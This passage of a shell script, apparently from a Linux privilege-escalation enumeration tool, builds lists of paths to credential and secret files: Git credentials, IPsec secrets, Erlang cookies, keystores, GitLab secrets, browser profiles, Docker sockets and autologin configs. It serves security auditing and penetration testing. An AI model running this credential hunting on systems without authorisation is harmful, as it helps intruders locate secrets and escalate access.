  PSTORAGE_NEO4J=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "neo4j$" | sort | uniq | head -n 70)
  PSTORAGE_CLOUD_INIT=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "cloud\.cfg$" | sort | uniq | head -n 70)
  PSTORAGE_ERLANG=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.erlang\.cookie$" | sort | uniq | head -n 70)
  PSTORAGE_SIP=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "sip\.conf$|amportal\.conf$|FreePBX\.conf$|Elastix\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_GMV_AUTH=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "gvm-tools\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_IPSEC=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "ipsec\.secrets$|ipsec\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_IRSSI=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.irssi$" | sort | uniq | head -n 70)
  PSTORAGE_KEYRING=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "keyrings$|.*\.keyring$|.*\.keystore$|.*\.jks$" | sort | uniq | head -n 70)
  PSTORAGE_VIRTUAL_DISKS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.vhd$|.*\.vhdx$|.*\.vmdk$" | sort | uniq | head -n 70)
  PSTORAGE_FILEZILLA=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "filezilla$|filezilla\.xml$|recentservers\.xml$" | sort | uniq | head -n 70)
  PSTORAGE_BACKUP_MANAGER=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "storage\.php$|database\.php$" | sort | uniq | head -n 70)
  PSTORAGE_SPLUNK=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "passwd$" | sort | uniq | head -n 70)
  PSTORAGE_GIT=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.git-credentials$" | sort | uniq | head -n 70)
  PSTORAGE_ATLANTIS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "atlantis\.db$" | sort | uniq | head -n 70)
  PSTORAGE_GITLAB=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '/lib' | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "secrets\.yml$|gitlab\.yml$|gitlab\.rm$" | sort | uniq | head -n 70)
  PSTORAGE_PGP_GPG=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E 'README.gnupg' | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.pgp$|.*\.gpg$|.*\.gnupg$" | sort | uniq | head -n 70)
  PSTORAGE_CACHE_VI=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.swp$|.*\.viminfo$" | sort | uniq | head -n 70)
  PSTORAGE_DOCKER=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "docker\.socket$|docker\.sock$|Dockerfile$|docker-compose\.yml$|dockershim\.sock$|containerd\.sock$|crio\.sock$|frakti\.sock$|rktlet\.sock$|\.docker$" | sort | uniq | head -n 70)
  PSTORAGE_FIREFOX=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^" | grep -E "\.mozilla$|Firefox$" | sort | uniq | head -n 70)
  PSTORAGE_CHROME=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^" | grep -E "google-chrome$|Chrome$" | sort | uniq | head -n 70)
  PSTORAGE_OPERA=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^" | grep -E "com\.operasoftware\.Opera$" | sort | uniq | head -n 70)
  PSTORAGE_SAFARI=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^" | grep -E "Safari$" | sort | uniq | head -n 70)
  PSTORAGE_AUTOLOGIN=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "autologin$|autologin\.conf$" | sort | uniq | head -n 70)
